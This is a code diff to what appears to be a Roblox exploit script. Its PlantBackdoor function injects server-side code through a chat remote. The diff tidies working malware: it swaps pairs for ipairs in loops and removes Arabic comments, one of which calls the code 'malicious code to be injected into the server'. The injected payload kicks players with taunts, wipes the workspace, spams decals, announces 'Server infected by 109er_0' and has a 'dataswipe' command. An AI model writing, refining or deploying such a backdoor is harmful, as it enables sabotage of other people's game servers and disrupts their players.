@@ -529,7 +529,6 @@ local function PlantBackdoor()
     end
     if not chatRemote then return false end
 
-    -- الكود الخبيث الذي سيتم حقنه في السيرفر
     local backdoorCode = [[
         local HttpService = game:GetService("HttpService")
         local Workspace = game:GetService("Workspace")
@@ -570,7 +569,7 @@ local function PlantBackdoor()
 
         local function runDecalSpam()
             local function exPro(root)
-                for _, v in pairs(root:GetChildren()) do
+                for _, v in ipairs(root:GetChildren()) do
                     if v:IsA("Decal") and v.Texture ~= "rbxassetid://8408806737" then
                         v.Parent = nil
                     elseif v:IsA("BasePart") then
@@ -595,7 +594,7 @@ local function PlantBackdoor()
             sky.Parent = Lighting
             Lighting.TimeOfDay = 12
             exPro(Workspace)
-            for _, v in pairs(Workspace:GetChildren()) do
+            for _, v in ipairs(Workspace:GetChildren()) do
                 if v:IsA("Sound") then v:Stop(); v:Destroy() end
             end
             local snd = Instance.new("Sound")
@@ -643,7 +642,7 @@ local function PlantBackdoor()
                     pcall(function() p:Kick("you'are an idiot HAHAHAHA Hacking by 109er_0 ... HAHAHAHA😈😈!!!!") end)
                 end
             elseif cmd == "wipe" then
-                for _, obj in pairs(Workspace:GetChildren()) do
+                for _, obj in ipairs(Workspace:GetChildren()) do
                     if obj ~= Workspace.Terrain and obj ~= Workspace.Camera then
                         pcall(function() obj:Destroy() end)
                     end
@@ -653,7 +652,7 @@ local function PlantBackdoor()
             elseif cmd == "color" then
                 Lighting.ColorCorrection.TintColor = Color3.new(math.random(), math.random(), math.random())
             elseif cmd == "decalspam" then
-                spawn(runDecalSpam)   -- تغليف لتجنب الخطأ
+                spawn(runDecalSpam)
             elseif cmd == "announce" then
                 sendMessageToAll("[OMEGA] Server infected by 109er_0!")
             elseif cmd == "dataswipe" then
